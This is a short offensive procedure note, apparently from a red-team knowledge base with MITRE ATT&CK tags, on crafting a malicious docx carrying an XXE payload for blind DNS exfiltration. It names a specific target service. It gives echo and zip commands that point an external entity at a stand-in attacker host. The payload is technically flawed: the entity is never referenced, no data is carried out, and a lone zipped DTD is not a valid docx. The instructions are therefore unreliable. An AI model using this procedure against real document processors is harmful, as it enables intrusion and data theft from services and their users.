---
tags:
  - xxe
  - payload-crafting
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/generate-xxe-payload]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 79aa5c96-44f4-4e95-acbd-bb13b3428a34
created_at: '2025-12-13T09:00:27.656Z'
updated_at: '2025-12-13T09:00:27.656Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft Malicious XML Document Payload

## Summary

This procedure involves creating a malicious XML-based document, such as a docx file, that includes an XXE payload to reference external entities for blind data exfiltration via DNS requests in vulnerable document processing systems.

## Description

The procedure targets blind XXE vulnerabilities where direct data retrieval is blocked, forcing exfiltration through DNS. It requires crafting a document with a custom DTD that triggers external entity resolution to an attacker-controlled DNS server. This is inferred from typical XXE exploitation on XML parsers in web services like pu.vk.com's document processor.

## Requirements

1. Access to basic file creation tools (e.g., echo, zip)
2. Knowledge of XML and DTD structures
3. Control over a DNS domain for exfiltration

## Defense

Defensive measures and detection strategies:

- Disable external entity resolution in XML parsers
- Monitor for unusual DNS traffic from servers

## Objectives

1. Create a payload that triggers XXE on processing
2. Enable blind exfiltration via DNS
3. Confirm payload validity before upload

## Instructions

### Step 1: Generate DTD Payload

**Context**: Create the external entity definition for DNS exfiltration.

**Command** ([[commands/generate-xxe-payload]]):
```bash
echo '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker-controlled.dns/" >]>' > payload.dtd
```

> This command generates a DTD file that defines an entity resolving to an attacker-controlled DNS endpoint.

### Step 2: Package into Docx

**Context**: Bundle the payload into a docx file format for upload.

**Command** ([[commands/generate-xxe-payload]]):
```bash
zip malicious.docx payload.dtd
```

> This zips the DTD into a docx structure, which will be parsed as XML upon processing.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/generate-xxe-payload]]

## Tools Used



## Tags

- [[xxe]]
- [[payload-crafting]]
